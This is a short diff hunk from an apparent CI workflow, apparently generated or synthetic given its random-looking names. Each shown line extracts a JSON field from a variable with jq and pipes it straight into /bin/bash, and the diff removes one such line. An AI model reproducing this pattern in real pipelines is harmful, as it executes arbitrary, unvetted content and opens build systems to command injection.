@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$w0794" | jq -r .fgai303 | /bin/bash
           printf '%s' "$jzqi0783" | jq -r .lh910 | /bin/bash
           printf '%s' "$t77" | jq -r .v3 | /bin/bash
-          echo $jrc13312 | jq -r .jm6 | /bin/bash
           printf '%s' "$myh50" | jq -r .egy8118 | /bin/bash
           printf '%s' "$dl4445" | jq -r .x232 | /bin/bash
 
